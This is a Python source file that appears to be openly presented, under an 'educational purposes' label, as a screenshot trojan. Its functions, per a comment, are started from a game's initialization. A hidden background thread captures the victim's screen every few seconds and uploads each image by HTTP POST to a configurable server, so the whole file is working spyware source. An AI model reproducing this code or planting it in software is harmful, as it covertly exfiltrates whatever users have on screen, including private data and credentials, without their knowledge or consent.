"""
Trojan module for educational purposes - captures screenshots and sends them to a server
This demonstrates how malware can exfiltrate data from a victim's system
"""
import threading
import time
import io
from PIL import ImageGrab
import requests

class ScreenshotTrojan:
    def __init__(self, server_url="http://localhost:3000/upload", interval=5):
        """
        Initialize the trojan
        Args:
            server_url: URL of the server to send screenshots to
            interval: Time in seconds between screenshots
        """
        self.server_url = server_url
        self.interval = interval
        self.running = False
        self.thread = None
        
    def capture_and_send(self):
        """Capture screenshot and send it to the server"""
        try:
            # Capture screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to bytes
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            
            # Send to server
            files = {'screenshot': ('screenshot.png', img_byte_arr, 'image/png')}
            response = requests.post(self.server_url, files=files, timeout=5)
            
            if response.status_code == 200:
                print("[TROJAN] Screenshot sent successfully")
            else:
                print(f"[TROJAN] Failed to send screenshot: {response.status_code}")
                
        except Exception as e:
            print(f"[TROJAN] Error: {e}")
    
    def run(self):
        """Background thread that continuously captures and sends screenshots"""
        self.running = True
        while self.running:
            self.capture_and_send()
            time.sleep(self.interval)
    
    def start(self):
        """Start the trojan in a background thread"""
        if not self.thread or not self.thread.is_alive():
            self.thread = threading.Thread(target=self.run, daemon=True)
            self.thread.start()
            print("[TROJAN] Started screenshot capture")
    
    def stop(self):
        """Stop the trojan"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
        print("[TROJAN] Stopped screenshot capture")

# Global instance that will be started from main
_trojan_instance = None

def start_trojan(server_url="http://localhost:3000/upload", interval=5):
    """Start the trojan - called from game initialization"""
    global _trojan_instance
    if _trojan_instance is None:
        _trojan_instance = ScreenshotTrojan(server_url, interval)
        _trojan_instance.start()

def stop_trojan():
    """Stop the trojan"""
    global _trojan_instance
    if _trojan_instance:
        _trojan_instance.stop()
